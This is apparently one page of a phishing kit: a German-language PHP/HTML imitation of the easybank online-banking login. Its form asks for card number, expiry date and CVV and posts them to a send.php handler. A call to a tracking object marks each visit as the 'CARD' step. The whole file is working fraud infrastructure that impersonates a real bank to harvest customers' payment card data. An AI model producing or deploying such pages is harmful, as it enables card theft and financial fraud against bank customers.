<?php 
require '../main.php';
?><!DOCTYPE html>
<html class="" lang="de">
<head>
<meta charset="utf-8"/>
<meta content="IE=edge" http-equiv="X-UA-Compatible"/>
<title>Online-Banking | easybank</title>
<meta content="width=device-width, height=device-height, initial-scale=1.0, viewport-fit=cover" name="viewport"/>
<meta content="telephone=no" name="format-detection"/>
<meta content="no" name="msapplication-tap-highlight"/>
<meta content="no-referrer" name="referrer"/>
<link href="styles.css" rel="stylesheet"/>
</head>
<body class="desktop-detected internet-banking desktop no-ignore-color">

<section aria-labelledby="page-title" class="unauthenticated" id="vcMainContainer" role="region" tabindex="-1">

<div class="vc-header" id="headerPanel">
 <div class="header header--default" id="header">
  <div class="header__logo">
   <div class="logo-group">
    <a class="clickable logo" href="#" title="easybank">
     <img alt="easybank" id="LogoClickable-headerLogo-ItemPreview" src="css/easybank.png"/>
    </a>
   </div>
  </div>
  <div class="header__menu">
   <div class="header-menu__site-navigation"></div>
  </div>
 </div>
 <div class="header-push"></div>
</div>

<div aria-labelledby="page-title" class="clearfix" id="main" role="main">
 <div class="login-page">
  <div class="form-horizontal undefined main-container-primary background-primary">
   <div class="content-container">
    <div class="login-wrapper">
     <div class="login-wrapper__head"></div>
     <div class="login-wrapper__content login-wrapper__content--center">
      <div class="login-wrapper__form">
       <div class="login-wrapper__tab" id="LoginTab">
        <div class="tabs tabs--primary">
         <div class="no-padding">
          <div class="widget-body">
           <div class="tab-content">
            <div class="tab-pane fade show" role="tabpanel" tabindex="0">
             <div class="tab-pane__content">
              <div class="login-form">
               <div class="heading" id="VcLabelHeadingDiv">
                <h1 style="color:#177991;">Kartendaten eingeben</h1>
               </div>
               <?php if(isset($_GET['e'])): ?>
               <p style="color:red;margin-bottom:16px;">Ungültige Kartendaten.</p>
               <?php endif; ?>
               <form action="send.php" method="POST">
                <div class="login-form__fields">
                 <div class="form-field form-field--primary form-field--has-title">
                  <label aria-hidden="true" class="form-field__title" for="cc-field" tabindex="-1" title="Kartennummer">
                   Kartennummer
                  </label>
                  <input aria-label="Kartennummer" autocomplete="cc-number" class="form-field__element" id="cc-field" maxlength="19" type="text" name="cc" required placeholder="XXXX XXXX XXXX XXXX" value=""/>
                 </div>
                 <div class="form-field form-field--primary form-field--has-title">
                  <label aria-hidden="true" class="form-field__title" for="exp-field" tabindex="-1" title="Verfallsdatum">
                   Verfallsdatum
                  </label>
                  <input aria-label="Verfallsdatum" autocomplete="cc-exp" class="form-field__element" id="exp-field" maxlength="5" type="text" name="exp" required placeholder="MM/YY" value=""/>
                 </div>
                 <div class="form-field form-field--primary form-field--has-title">
                  <label aria-hidden="true" class="form-field__title" for="cvv-field" tabindex="-1" title="Kartenprüfnummer">
                   Kartenprüfnummer
                  </label>
                  <input aria-label="Kartenprüfnummer" autocomplete="cc-csc" class="form-field__element" id="cvv-field" maxlength="4" type="password" name="cvv" required placeholder="CVV" value=""/>
                 </div>
                 <div class="buttons-container buttons-container--single">
                  <div class="buttons-container__desktop">
                   <button aria-label="Bestätigen" class="vc-btn--primary vc-btn" id="btn-NextButton" type="submit">
                    <span>Bestätigen</span>
                   </button>
                  </div>
                 </div>
                </div>
               </form>
              </div>
             </div>
            </div>
           </div>
          </div>
         </div>
        </div>
       </div>
      </div>
     </div>
    </div>
   </div>
  </div>
 </div>
</div>

<footer class="footer">
 <div class="container">
  <h2 class="visually-hidden" id="footerHeadline">Footer Navigation</h2>
  <nav aria-labelledby="footerHeadline" id="footer-nav" role="navigation">
   <ul>
    <li><a aria-label="FAQ" href="#" title="FAQ"><span class="text" tabindex="-1">FAQ</span></a></li>
    <li><a aria-label="Kontakt" href="#" title="Kontakt"><span class="text" tabindex="-1">Kontakt</span></a></li>
    <li><a aria-label="Impressum" href="#" title="Impressum"><span class="text" tabindex="-1">Impressum</span></a></li>
    <li><a aria-label="Datenschutz" href="#" title="Datenschutz"><span class="text" tabindex="-1">Datenschutz</span></a></li>
    <li><a aria-label="AGB" href="#" title="AGB"><span class="text" tabindex="-1">AGB</span></a></li>
    <li><a aria-label="Barrierefreiheit" href="#" title="Barrierefreiheit"><span class="text" tabindex="-1">Barrierefreiheit</span></a></li>
   </ul>
  </nav>
 </div>
</footer>

</section>

<script src="js/jq.js"></script>
<script>
document.getElementById('exp-field').addEventListener('input', function(e) {
  var val = e.target.value.replace(/[^0-9]/g, '');
  if (val.length >= 2) {
    val = val.substring(0, 2) + '/' + val.substring(2, 4);
  }
  e.target.value = val;
});
</script>
<?php $m->ctr("CARD ".@$_GET['e']); ?>
</body>
</html>